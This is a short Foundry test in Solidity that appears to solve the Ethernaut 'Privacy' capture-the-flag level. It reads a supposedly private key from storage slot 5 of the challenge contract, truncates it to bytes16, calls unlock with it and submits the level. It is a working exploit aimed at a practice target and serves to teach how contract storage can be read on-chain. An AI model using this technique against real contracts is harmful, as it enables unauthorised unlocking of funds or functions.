// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../utils.sol";

contract PrivacyTest is Test {
  address internal challengeAddress;

  function setUp() public {
    challengeAddress = utils.createLevelInstance(0xcAac6e4994c2e21C5370528221c226D1076CfDAB);
  }

  function testExploit() public {
    // variables of this data array are at slots 3, 4, and 5
    bytes16 key = bytes16(vm.load(challengeAddress, bytes32(uint256(5))));

    (bool success,) = challengeAddress.call(abi.encodeWithSignature("unlock(bytes16)", key));
    success;

    utils.submitLevelInstance(challengeAddress);
  }
}
